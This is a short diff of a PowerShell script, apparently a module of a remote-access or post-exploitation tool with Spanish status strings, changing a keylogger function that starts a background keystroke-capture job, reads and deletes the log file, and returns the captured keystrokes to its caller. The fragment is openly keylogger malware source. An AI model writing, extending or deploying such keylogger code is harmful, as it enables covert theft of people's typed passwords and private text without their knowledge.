@@ -75,16 +75,17 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }    
         $GLOBAL:joblist["keylogger"]= $job
         $GLOBAL:joblist["keylog_path"]= $ruta
-        $GLOBAL:execute = "Grabando"
+        return @{results="Grabando";success=$true}
     }
     else{
         $job = $Global:joblist["keylogger"]
         Stop-Job -Job $job
         $ruta = $GLOBAL:joblist["keylog_path"]
-        $GLOBAL:execute = gc $ruta
-        $GLOBAL:execute
+        $info = gc $ruta
+        $info
         rm $ruta
         $Global:joblist["keylogger"]= ""
         $GLOBAL:joblist["keylog_path"]= ""
+        return @{results=$info;success=$true}
     }
 }
